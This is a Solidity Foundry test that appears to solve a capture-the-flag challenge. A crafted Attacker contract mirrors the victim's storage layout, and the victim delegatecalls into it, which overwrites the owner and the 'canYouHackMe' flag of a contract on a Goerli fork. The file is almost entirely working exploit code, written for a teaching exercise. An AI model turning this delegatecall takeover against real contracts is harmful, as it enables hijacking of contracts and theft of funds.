// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// src/D3l3g4t3.sol

/// Define the interface for the Target contract
interface ITarget {
    function hackMe(bytes calldata bites) external returns (bool, bytes memory);

    function hacked() external;

    function canYouHackMe(address) external view returns (bool);

    function owner() external view returns (address);
}

contract Attacker {
    /// Storage slot setup should be same as the victim
    uint256 a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping(address => bool) public canYouHackMe;

    function overwriteStorage(address _attacker) external {
        owner = _attacker;
        canYouHackMe[_attacker] = true;
    }

    function attack(address target) external {
        target.call(
            abi.encodeWithSignature(
                "hackMe(bytes)", abi.encodeWithSignature("overwriteStorage(address)", address(this))
            )
        );
    }
}

contract D3l3g4t3Solved is Test {
    ITarget target = ITarget(0x971e55F02367DcDd1535A7faeD0a500B64f2742d);

    function setUp() public {
        /// Run the test against the goerli testnet fork
        vm.createSelectFork("https://rpc.ankr.com/eth_goerli");
    }

    function test_exploit() external {
        Attacker attacker = new Attacker();

        attacker.attack(address(target));

        assertEq(target.canYouHackMe(address(attacker)), true);
        assertEq(target.owner(), address(attacker));
    }
}
